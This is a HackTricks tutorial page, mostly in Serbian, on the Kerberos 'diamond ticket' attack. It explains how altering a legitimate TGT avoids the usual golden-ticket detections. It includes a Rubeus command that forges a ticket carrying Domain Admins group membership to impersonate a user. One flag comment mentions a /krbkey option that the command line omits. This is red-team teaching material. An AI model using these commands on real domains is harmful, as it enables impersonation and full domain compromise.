# Diamond Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Diamond Ticket

**Kao zlatna karta**, dijamantska karta je TGT koja se može koristiti za **pristup bilo kojoj usluzi kao bilo koji korisnik**. Zlatna karta se potpuno forgira van mreže, enkriptovana sa krbtgt hash-om te domene, a zatim se prosledi u sesiju prijavljivanja za korišćenje. Pošto kontroleri domena ne prate TGT-ove koje su legitimno izdale, rado će prihvatiti TGT-ove koji su enkriptovani sa svojim krbtgt hash-om.

Postoje dve uobičajene tehnike za otkrivanje korišćenja zlatnih karata:

* Tražite TGS-REQ-ove koji nemaju odgovarajući AS-REQ.
* Tražite TGT-ove koji imaju glupe vrednosti, kao što je podrazumevani vek trajanja od 10 godina u Mimikatz-u.

**Dijamantska karta** se pravi **modifikovanjem polja legitimnog TGT-a koji je izdao DC**. To se postiže **zahtevom** za **TGT**, **dekripcijom** sa krbtgt hash-om domene, **modifikovanjem** željenih polja karte, a zatim **ponovnim enkriptovanjem**. Ovo **prevazilazi dva prethodno pomenuta nedostatka** zlatne karte jer:

* TGS-REQ-ovi će imati prethodni AS-REQ.
* TGT je izdao DC što znači da će imati sve tačne detalje iz Kerberos politike domene. Iako se ovi mogu tačno forgirati u zlatnoj karti, to je složenije i otvoreno za greške.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
